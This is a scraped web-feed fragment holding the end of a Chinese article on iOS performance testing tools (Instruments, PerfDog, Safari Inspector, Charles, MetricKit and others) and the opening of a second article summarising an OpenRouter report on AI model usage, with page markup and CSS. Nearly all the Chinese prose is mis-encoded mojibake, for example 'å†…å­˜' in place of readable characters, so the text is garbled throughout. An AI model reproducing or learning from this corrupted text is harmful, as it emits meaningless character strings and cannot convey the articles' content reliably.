<h3 data-id="heading-3"><strong>3. å†…å­˜ä¸Šæ¶¨å¯èƒ½ä¸æ˜¯æ³„æ¼ï¼Œè€Œæ˜¯å›¾ç‰‡ç¼“å­˜ç­–ç•¥ä¸åˆç†å¯¼è‡´ï¼Œä»¥åŠåå°ä»»åŠ¡ç•™å­˜</strong></h3>
<h3 data-id="heading-4"><strong>4. å‘çƒ­å¯èƒ½ä¸æ˜¯æ¸²æŸ“å‹åŠ›ï¼Œè€Œæ˜¯æŸäº›é¢‘ç¹è°ƒåº¦çš„ Timer é€ æˆ CPU æŒç»­æ´»è·ƒ</strong></h3>
<p>å› æ­¤æ€§èƒ½æµ‹è¯•å¿…é¡»å…·å¤‡è·¨å±‚çº§è§‚å¯Ÿèƒ½åŠ›ã€‚</p>
<hr/>
<h2 data-id="heading-5">äºŒã€iOS æ€§èƒ½æµ‹è¯•çš„æ ¸å¿ƒç»´åº¦ï¼ˆå¿…é¡»å…¨è¦†ç›–ï¼‰</h2>
<h3 data-id="heading-6"><strong>1. CPU</strong></h3>
<ul>
<li>è®¡ç®—å‹åŠ›</li>
<li>ä¸»çº¿ç¨‹é˜»å¡</li>
<li>JSONã€å¤§å¾ªç¯ã€å¸ƒå±€è®¡ç®—</li>
</ul>
<h3 data-id="heading-7"><strong>2. GPU</strong></h3>
<ul>
<li>ç¦»å±æ¸²æŸ“</li>
<li>åŠ¨ç”»åˆ·æ–°é¢‘ç‡</li>
<li>åˆ—è¡¨å¿«é€Ÿæ»šåŠ¨</li>
</ul>
<h3 data-id="heading-8"><strong>3. å†…å­˜</strong></h3>
<ul>
<li>æ³„æ¼ï¼ˆæ³„æ¼å¯¼è‡´é•¿æœŸæ¶¨ï¼‰</li>
<li>é«˜å³°å€¼</li>
<li>WebView å†…å­˜è†¨èƒ€</li>
<li>å¯¹è±¡æœªé‡Šæ”¾</li>
</ul>
<h3 data-id="heading-9"><strong>4. ç½‘ç»œ</strong></h3>
<ul>
<li>å“åº”è€—æ—¶</li>
<li>èµ„æºå¤§å°</li>
<li>å¼±ç½‘ä¸‹è¡Œä¸º</li>
</ul>
<h3 data-id="heading-10"><strong>5. Web / Hybrid</strong></h3>
<ul>
<li>JS é•¿ä»»åŠ¡</li>
<li>DOM é‡ç»˜</li>
<li>èµ„æºåŠ è½½é€»è¾‘</li>
</ul>
<h3 data-id="heading-11"><strong>6. ç³»ç»Ÿè¡Œä¸º</strong></h3>
<ul>
<li>thermal é™é¢‘</li>
<li>jetsamï¼ˆå†…å­˜æ€ï¼‰</li>
<li>watchdogï¼ˆå¡æ­»æ€ï¼‰</li>
</ul>
<p>ä»»ä½•ä¸€ä¸ªç»´åº¦å¤±æ§éƒ½ä¼šé€ æˆâ€œæ€§èƒ½é—®é¢˜â€ã€‚</p>
<hr/>
<h2 data-id="heading-12">ä¸‰ã€Instrumentsï¼šåº•å±‚æ€§èƒ½åˆ†æçš„æ——èˆ°å·¥å…·</h2>
<p>Instruments æ˜¯æ•´ä¸ªæ€§èƒ½æµ‹è¯•ä½“ç³»ä¸­å¿…é¡»æŒæ¡çš„ä¸€ç¯ã€‚</p>
<h3 data-id="heading-13"><strong>1. Time Profiler â†’ CPU æ·±åº¦åˆ†æ</strong></h3>
<p>ç”¨äºï¼š</p>
<ul>
<li>å®šä½çƒ­ç‚¹å‡½æ•°</li>
<li>æŸ¥æ‰¾é˜»å¡è°ƒç”¨</li>
<li>åˆ†æä¸»çº¿ç¨‹æ‰§è¡Œæ—¶é—´</li>
</ul>
<p>éå¸¸é€‚åˆé¡µé¢åŠ è½½æ…¢ã€äº¤äº’å»¶è¿Ÿç±»é—®é¢˜ã€‚</p>
<h3 data-id="heading-14"><strong>2. Core Animation â†’ GPU &amp; æ¸²æŸ“åˆ†æ</strong></h3>
<p>å¯ä»¥æ£€æµ‹ï¼š</p>
<ul>
<li>æ‰å¸§åŸå› </li>
<li>ç¦»å±æ¸²æŸ“</li>
<li>è§†å›¾å±‚çº§è¿‡æ·±</li>
</ul>
<p>å¸¸ç”¨äºåˆ—è¡¨æ€§èƒ½ã€åŠ¨ç”»æ€§èƒ½æµ‹è¯•ã€‚</p>
<h3 data-id="heading-15"><strong>3. Allocations / Leaks â†’ å†…å­˜å ç”¨ä¸æ³„æ¼æ£€æµ‹</strong></h3>
<p>å¯è¯†åˆ«ï¼š</p>
<ul>
<li>æœªé‡Šæ”¾çš„å¯¹è±¡</li>
<li>WebView / å›¾ç‰‡å ç”¨</li>
<li>å¯¹è±¡åå¤åˆ›å»º</li>
</ul>
<p>Instruments è´Ÿè´£â€œæ·±åº¦æ£€ä¿®å±‚é¢â€çš„æ€§èƒ½è¯Šæ–­ã€‚</p>
<hr/>
<h2 data-id="heading-16">å››ã€å…‹é­”ï¼ˆKeyMobï¼‰ï¼šçœŸæœºæ€§èƒ½ç›‘æ§ + ç³»ç»Ÿæ—¥å¿—è¡¥å…¨</h2>
<p>æ€§èƒ½é—®é¢˜å¾ˆå¤šéƒ½åªæœ‰åœ¨çœŸæœºã€å¤šåœºæ™¯ã€é•¿æ—¶é—´è¿è¡Œä¸‹æ‰ä¼šæš´éœ²ï¼Œå› æ­¤ KeyMob åœ¨æ€§èƒ½ä½“ç³»ä¸­æ‰¿æ‹…â€œè¡Œä¸ºè§‚æµ‹å™¨â€çš„ä½œç”¨ã€‚</p>
<h3 data-id="heading-17"><strong>1. çœŸæœºå®æ—¶ç›‘æ§ï¼ˆé•¿æ—¶é—´æ€§èƒ½æµ‹è¯•ï¼‰</strong></h3>
<p>åŒ…æ‹¬ï¼š</p>
<ul>
<li>CPUï¼ˆå«ä¸»çº¿ç¨‹ï¼‰</li>
<li>GPU</li>
<li>FPS</li>
<li>å†…å­˜è¶‹åŠ¿</li>
<li>ç½‘ç»œåå</li>
<li>æ¸©åº¦ã€ç”µé‡å˜åŒ–</li>
</ul>
<p>é€‚ç”¨äºï¼š</p>
<ul>
<li>é•¿æ—¶é—´å‹æµ‹</li>
<li>é«˜é¢‘äº¤äº’é¡µé¢</li>
<li>å¯¹æ¯”ä¸åŒç‰ˆæœ¬æ€§èƒ½å˜åŒ–</li>
</ul>
<h3 data-id="heading-18"><strong>2. ç³»ç»Ÿæ—¥å¿—æ˜¯å®šä½éšè—æ€§èƒ½é—®é¢˜çš„å…³é”®</strong></h3>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">jetsam: memory pressure high</span>
<span class="hljs-section">watchdog: main thread blocked</span>
<span class="hljs-section">thermal: CPU frequency reduced</span>
WebKit process terminated
</code></pre>
<p>è¿™äº›ä¿¡æ¯å¾€å¾€æ­ç¤ºâ€œä¸ºä»€ä¹ˆæ€§èƒ½æŒç»­æ¶åŒ–â€ã€‚</p>
<h3 data-id="heading-19"><strong>3. æ–‡ä»¶ç³»ç»Ÿåˆ†æ</strong></h3>
<p>ç”¨äºï¼š</p>
<ul>
<li>æ£€æŸ¥ç¼“å­˜æ–‡ä»¶æ˜¯å¦å¼‚å¸¸å¢é•¿</li>
<li>WebView ç¼“å†²æ˜¯å¦è†¨èƒ€</li>
<li>æ•°æ®åº“æ–‡ä»¶è¿‡å¤§å¯¼è‡´å¯åŠ¨æ…¢</li>
</ul>
<p>è¿™äº›ä¹Ÿæ˜¯æ€§èƒ½æµ‹è¯•çš„ä¸€éƒ¨åˆ†ã€‚</p>
<hr/>
<h2 data-id="heading-20">äº”ã€PerfDogï¼šæ¸²æŸ“æ€§èƒ½ä¸é«˜äº¤äº’åœºæ™¯çš„ä¸“ä¸šå·¥å…·</h2>
<p>PerfDog åœ¨æµ‹è¯•é«˜äº¤äº’ã€é«˜åŠ¨ç”»åœºæ™¯æ—¶éå¸¸é«˜æ•ˆã€‚</p>
<h3 data-id="heading-21">èƒ½ç›‘æ§ï¼š</h3>
<ul>
<li>FPS æ•´ä½“è¶‹åŠ¿</li>
<li>æ‰å¸§ç‚¹åˆ†å¸ƒ</li>
<li>CPU/GPU æ›²çº¿</li>
<li>å†…å­˜åŠ¨æ€å˜åŒ–</li>
<li>å‘çƒ­æƒ…å†µ</li>
</ul>
<p>é€‚ç”¨äºï¼š</p>
<ul>
<li>é•¿åˆ—è¡¨</li>
<li>åŠ¨ç”»å¯†é›†é¡µé¢</li>
<li>Flutter / Unity / RN</li>
<li>è§†é¢‘æ’­æ”¾åœºæ™¯</li>
</ul>
<p>å¦‚æœ UI å¡é¡¿ï¼Œæ˜¯ CPUã€GPU è¿˜æ˜¯çº¿ç¨‹è°ƒåº¦é—®é¢˜ï¼ŒPerfDog çš„æ›²çº¿èƒ½ä¸€çœ¼çœ‹å‡ºæ¥ã€‚</p>
<hr/>
<h2 data-id="heading-22">å…­ã€Safari Inspectorï¼šWebView æ€§èƒ½æµ‹è¯•çš„å”¯ä¸€å¯é å·¥å…·</h2>
<p>Hybrid é¡µé¢æ€§èƒ½é—®é¢˜å¾€å¾€æ¥æºäºï¼š</p>
<ul>
<li>DOM å¤§å°</li>
<li>JS é•¿ä»»åŠ¡</li>
<li>JSBridge é¢‘ç¹è°ƒç”¨</li>
<li>WebKit è¿›ç¨‹å†…å­˜å ç”¨</li>
<li>H5 å›¾ç‰‡èµ„æºè¿‡å¤§</li>
</ul>
<p>Safari Inspector å¯æ£€æµ‹ï¼š</p>
<ul>
<li>JS æ‰§è¡Œæ—¶é—´æŸ±çŠ¶å›¾</li>
<li>DOM ä¿®æ”¹æ¬¡æ•°</li>
<li>ç½‘ç»œèµ„æºåŠ è½½æ—¶é—´</li>
<li>WebKit ç³»ç»ŸæŠ¥é”™</li>
</ul>
<p>é€‚ç”¨äº uni-appã€å°ç¨‹åº SDKã€Hybrid é¦–é¡µã€æ´»åŠ¨é¡µç­‰ã€‚</p>
<hr/>
<h2 data-id="heading-23">ä¸ƒã€Charlesï¼šç½‘ç»œæ€§èƒ½æµ‹è¯•çš„å¿…å¤‡ç¯èŠ‚</h2>
<p>ç½‘ç»œé—®é¢˜å¸¸å¸¸ä¼ªè£…æˆæ€§èƒ½é—®é¢˜ã€‚</p>
<p>Charles å¯ç”¨äºï¼š</p>
<ul>
<li>æŠ“åŒ…åˆ†æå“åº”è€—æ—¶</li>
<li>æ£€æŸ¥æ¥å£æ˜¯å¦è¿‡å¤š</li>
<li>å¼±ç½‘æ¨¡æ‹ŸéªŒè¯ç”¨æˆ·ä½“éªŒ</li>
<li>æ£€æŸ¥èµ„æºç¼“å­˜ç­–ç•¥</li>
<li>æ£€æŸ¥æ˜¯å¦å­˜åœ¨é‡å¤è¯·æ±‚</li>
</ul>
<p>é¦–å±æ…¢ã€åŠ è½½ç¼“æ…¢ã€ç™½å±ç­‰é—®é¢˜å¾€å¾€æºäºç½‘ç»œå±‚ï¼Œè€Œä¸æ˜¯æ¸²æŸ“å±‚ã€‚</p>
<hr/>
<h2 data-id="heading-24">å…«ã€MetricKitï¼šä¸Šçº¿æ€§èƒ½è¶‹åŠ¿çš„çœŸå®æ•°æ®æ¥æº</h2>
<p>MetricKit æä¾›ç³»ç»Ÿçº§æ€§èƒ½è¯Šæ–­ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>å¯åŠ¨æ—¶é—´</li>
<li>å¡é¡¿è¯Šæ–­ï¼ˆhangï¼‰</li>
<li>CPU å³°å€¼</li>
<li>å†…å­˜å³°å€¼</li>
<li>WebKit å´©æºƒ</li>
<li>jetsam / watchdog</li>
<li>I/O è€—æ—¶</li>
</ul>
<p>é€‚ç”¨äºéªŒè¯æ¯ä¸ªç‰ˆæœ¬çš„æ€§èƒ½æ˜¯å¦é€€åŒ–ã€‚</p>
<hr/>
<h2 data-id="heading-25">ä¹ã€Crashlyticsï¼šå¸®åŠ©åˆ†æâ€œæ€§èƒ½å¯¼è‡´çš„å´©æºƒâ€</h2>
<p>Crashlytics ä¸æ˜¯æ€§èƒ½å·¥å…·ï¼Œä½†å…¶æ•°æ®è¡¥å……æä¸ºé‡è¦ï¼š</p>
<ul>
<li>ä¸»çº¿ç¨‹å¡ä½</li>
<li>çº¿ç¨‹æ± è¿‡å¤š</li>
<li>WebView å¼‚å¸¸</li>
<li>èµ„æºåŠ è½½å¤±è´¥</li>
<li>åå°çº¿ç¨‹æœªé‡Šæ”¾</li>
</ul>
<p>è¿™äº›å¼‚å¸¸ç»å¸¸æç¤ºâ€œæ€§èƒ½å·²ç»æ¶åŒ–åˆ°å½±å“ç¨³å®šæ€§â€ã€‚</p>
<hr/>
<h2 data-id="heading-26">åã€æ„å»ºå¤šå·¥å…·ååŒçš„ iOS æ€§èƒ½æµ‹è¯•çŸ©é˜µ</h2>













































<table><thead><tr><th>åœºæ™¯</th><th>å·¥å…·ç»„åˆ</th><th>èƒ½è§£å†³çš„é—®é¢˜</th></tr></thead><tbody><tr><td>é¡µé¢åŠ è½½æ…¢</td><td>Instruments + Charles</td><td>CPU çƒ­ç‚¹ã€ç½‘ç»œé“¾è·¯</td></tr><tr><td>åŠ¨ç”»å¡é¡¿</td><td>Core Animation + PerfDog</td><td>GPUã€ç¦»å±æ¸²æŸ“</td></tr><tr><td>å†…å­˜æ¶¨</td><td>Allocations + KeyMob</td><td>æ³„æ¼ã€ç¼“å­˜è†¨èƒ€</td></tr><tr><td>Hybrid å¡é¡¿</td><td>Safari Inspector + KeyMob</td><td>JSã€DOMã€èµ„æº</td></tr><tr><td>è§†é¢‘/å¤šåª’ä½“</td><td>PerfDog + KeyMob</td><td>CPU/GPU å³°å€¼ã€å†…å­˜å³°å€¼</td></tr><tr><td>å¼±ç½‘æ€§èƒ½</td><td>Charles + KeyMob</td><td>è¶…æ—¶ã€é‡è¯•ã€æµæ§</td></tr><tr><td>ç¨³å®šæ€§æ€§èƒ½</td><td>KeyMob + MetricKit</td><td>ç³»ç»Ÿè¡Œä¸ºã€æ¸©åº¦ã€jetsam</td></tr></tbody></table>
<p>è¿™ä¸ªçŸ©é˜µè¦†ç›–æ—¥å¸¸ç»å¤§å¤šæ•°æ€§èƒ½é—®é¢˜ã€‚</p>
<hr/>
<h2 data-id="heading-27">æ€§èƒ½æµ‹è¯•æ˜¯å·¥ç¨‹èƒ½åŠ›ï¼Œè€Œä¸æ˜¯å·¥å…·èƒ½åŠ›</h2>
<p>æˆç†Ÿçš„ iOS æ€§èƒ½æµ‹è¯•ä½“ç³»åº”è¯¥å…·å¤‡ï¼š</p>
<p><strong>å¯è§‚æµ‹ â†’ å¯é‡åŒ– â†’ å¯å®šä½ â†’ å¯å¤ç° â†’ å¯å›å½’ â†’ å¯ç›‘æ§</strong></p>
<p>è¿™ä¸€ä½“ç³»ä¾èµ–å¤šå·¥å…·ååŒï¼š</p>
<ul>
<li><strong>Instruments</strong>ï¼šæ·±åº¦è¯Šæ–­</li>
<li><strong>KeyMob</strong>ï¼šçœŸæœºç›‘æ§ä¸ç³»ç»Ÿæ—¥å¿—</li>
<li><strong>PerfDog</strong>ï¼šæ¸²æŸ“æ€§èƒ½ä¸äº¤äº’æ€§èƒ½</li>
<li><strong>Safari Inspector</strong>ï¼šWebView æ€§èƒ½</li>
<li><strong>Charles</strong>ï¼šç½‘ç»œé“¾è·¯æ€§èƒ½</li>
<li><strong>MetricKit</strong>ï¼šçº¿ä¸Šè¡¨ç°</li>
<li><strong>Crashlytics</strong>ï¼šæ€§èƒ½ç›¸å…³å¼‚å¸¸</li>
</ul>
<p>åªæœ‰å…¨é“¾è·¯èƒ½åŠ›é½å¤‡ï¼Œæ‰èƒ½çœŸæ­£è§£å†³å¤æ‚æ€§èƒ½é—®é¢˜ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆ†æäº† 100 ä¸‡äº¿ Token åï¼Œå¾—å‡ºçš„å‡ ä¸ªå…³äº AI çš„çœŸç›¸]]></title>    <link>https://juejin.cn/post/7581004702945263643</link>    <guid>https://juejin.cn/post/7581004702945263643</guid>    <pubDate>2025-12-08T04:16:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581004702945263643" data-draft-id="7580971667037077530" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆ†æäº† 100 ä¸‡äº¿ Token åï¼Œå¾—å‡ºçš„å‡ ä¸ªå…³äº AI çš„çœŸç›¸"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-08T04:16:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ConardLi"/> <meta itemprop="url" content="https://juejin.cn/user/3949101466785709"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆ†æäº† 100 ä¸‡äº¿ Token åï¼Œå¾—å‡ºçš„å‡ ä¸ªå…³äº AI çš„çœŸç›¸
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3949101466785709/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ConardLi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:16:27.000Z" title="Mon Dec 08 2025 04:16:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025 æ³¨å®šæ˜¯è¦è¢«è½½å…¥ AI å²å†Œçš„ä¸€å¹´ï¼Œå¤§æ¨¡å‹æ‰å †å‘å¸ƒã€å¼€æºç”Ÿæ€ç©ºå‰ç¹è£...</p>
<p>ä½†æŠ€æœ¯çªç ´çš„å–§åš£ä¹‹å¤–ï¼ŒçœŸå®ä¸–ç•Œç©¶ç«Ÿå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</p>
<p>å¤§å®¶å¥½ï¼Œæ¬¢è¿æ¥åˆ° codeç§˜å¯†èŠ±å›­ï¼Œæˆ‘æ˜¯èŠ±å›­è€å¸ˆï¼ˆConardLiï¼‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17a129d6a2624546af4e841be70b8de3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=yiCcRUYZRG57NULaVoYQhyda%2Fsc%3D" alt="" loading="lazy"/></p>
<p>æœ€è¿‘ï¼Œ<code>OpenRouter</code> å‘å¸ƒäº†ä¸€ä»½éå¸¸ç¡¬æ ¸çš„ AI æŠ€æœ¯æŠ¥å‘Šï¼Œå®ƒé€šè¿‡åˆ†ææµ·é‡çš„ LLM è¯·æ±‚è°ƒç”¨è®°å½•ï¼ˆè¶…è¿‡ 100 ä¸‡äº¿ Tokenï¼‰ï¼Œèƒ½çœ‹åˆ°å…¨çƒç”¨æˆ·åˆ°åº•åœ¨ç”¨ä»€ä¹ˆæ¨¡å‹ã€å¹²ä»€ä¹ˆäº‹å„¿ã€æ„¿æ„èŠ±å¤šå°‘é’±ï¼Œå¹¶ä¸”è¯•å›¾ç»˜åˆ¶å‡ºä¸€å¼ æœ€çœŸå®çš„ <strong>â€˜å…¨çƒ AI åœ°å½¢å›¾â€™</strong>ã€‚å¦‚æœä½ è¿˜è®¤ä¸ºå¼€æºæ¨¡å‹åªæ˜¯é™ªè·‘ã€é™ä»·å°±èƒ½æ¢æ¥ç”¨æˆ·ã€æˆ–è€…åŒ—ç¾ä¾ç„¶å„æ–­ä¸€åˆ‡ï¼Œé‚£ä¹ˆè¿™ç¯‡æŠ¥å‘Šå°†å½»åº•é‡å¡‘ä½ çš„ä¸–ç•Œè§‚ã€‚</p>
<p>è¿™ä»½æŠ¥å‘Šéå¸¸é•¿ï¼Œä¸‹é¢æ˜¯æˆ‘æ€»ç»“çš„ä¸€äº›å…³é”®é‡ç‚¹å†…å®¹ï¼Œè®©æˆ‘ä»¬ä¸€èµ·æ¥å­¦ä¹ ä¸€ä¸‹ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€å¼€æºå’Œé—­æºæ¨¡å‹</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d5975eed6a04a2c9e3d7c3bc9c40c02~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=ddxiraE%2F4HsC%2FjJN8GbySYiQhxI%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>å°½ç®¡æ¥è‡ªåŒ—ç¾å¤§å‚çš„é—­æºæ¨¡å‹ä¾ç„¶å æ®ä¸»å¯¼åœ°ä½ï¼ˆå¹³å‡çº¦å  70% çš„ä»½é¢ï¼‰ï¼Œä½†å¼€æºæ¨¡å‹çš„ä½¿ç”¨é‡åœ¨ 2025 å¹´ç¨³æ­¥å¢é•¿ï¼Œåˆ°äº†å¹´åº•å·²ç»æ‹¿ä¸‹äº†çº¦ä¸‰åˆ†ä¹‹ä¸€çš„å¸‚åœºä»½é¢ï¼Œå½¢æˆäº†ä¸€ç§ç›¸å¯¹ç¨³å®šçš„å¹³è¡¡ã€‚</p>
</li>
<li>
<p>å¼€æºæ¨¡å‹çš„å¢é•¿çš„ä¸»è¦åŠ¨åŠ›æ¥è‡ªä¸­å›½å¼€å‘çš„æ¨¡å‹ã€‚ä» 2024 å¹´åº•å¾®ä¸è¶³é“çš„ 1.2% èµ·æ­¥ï¼Œä¸­å›½å¼€æºæ¨¡å‹å‡­å€Ÿå¿«é€Ÿçš„è¿­ä»£å‘¨æœŸå’Œè¿‡ç¡¬çš„è´¨é‡ï¼ˆå¦‚ Qwen å’Œ DeepSeek ç³»åˆ—ï¼‰ï¼Œè¿…é€ŸæŠ¢å å¸‚åœºï¼Œåœ¨æŸäº›æ—¶æ®µç”šè‡³è´¡çŒ®äº†è¿‘ 30% çš„æ€»ä½¿ç”¨é‡ã€‚</p>
</li>
<li>
<p>æ•°æ®çš„é£™å‡å¾€å¾€ç´§éšé‡ç£…æ¨¡å‹çš„å‘å¸ƒï¼ˆå¦‚ DeepSeek V3ã€Kimi K2 ç­‰ï¼‰ï¼Œä½†å…³é”®åœ¨äºï¼Œè¿™äº›å¢é•¿åœ¨å‘å¸ƒçƒ­åº¦é€€å»åä¾ç„¶å¾—ä»¥ä¿æŒã€‚è¿™è¯´æ˜ç”¨æˆ·ä¸ä»…ä»…æ˜¯åœ¨å°é²œï¼Œè€Œæ˜¯çœŸæ­£å°†è¿™äº›å¼€æºæ¨¡å‹æŠ•å…¥åˆ°äº†é•¿æœŸçš„ç”Ÿäº§ç¯å¢ƒä¸­ã€‚</p>
</li>
</ul>
<h2 data-id="heading-1">äºŒã€å¼€æºæ¨¡å‹ä»â€œä¸€å®¶ç‹¬å¤§â€èµ°å‘â€œç™¾èŠ±é½æ”¾â€</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/626c65fca93b45ddbd500793d5593f0d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=Qu7bsT1BmzYRf83VKxzr%2BcQKQz8%3D" alt="" loading="lazy"/></p>
<ul>
<li>
